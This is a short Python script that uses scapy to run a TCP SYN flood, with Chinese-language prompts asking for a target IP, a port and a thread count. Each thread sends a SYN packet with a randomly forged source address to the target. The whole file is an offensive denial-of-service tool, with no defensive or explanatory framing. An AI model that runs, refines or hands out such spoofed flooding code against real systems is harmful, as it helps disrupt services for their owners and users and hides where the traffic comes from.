# -*- coding: utf-8 -*-
import threading
import random
from scapy.sendrecv import sr1, send, sendp
from scapy.layers.inet import IP, TCP


def syn_flood(ip, port):
    r1 = random.randint(2, 254)
    r2 = random.randint(2, 254)
    r3 = random.randint(2, 254)
    r4 = random.randint(2, 254)
    src_ip = str(r1) + "." + str(r2) + "." + str(r3) + "." + str(r4)
    seq = random.randint(100000, 200000)
    send(IP(dst=ip, src=src_ip) / TCP(dport=port, flags="S", seq=seq))


if __name__ == '__main__':
    ip = input("请输入ip：")
    port = int(input("请输入端口："))
    number = int(input("请输入线程数："))
    for i in range(number):
        pop = threading.Thread(target=syn_flood, args=(ip, port))
        pop.daemon = True
        pop.start()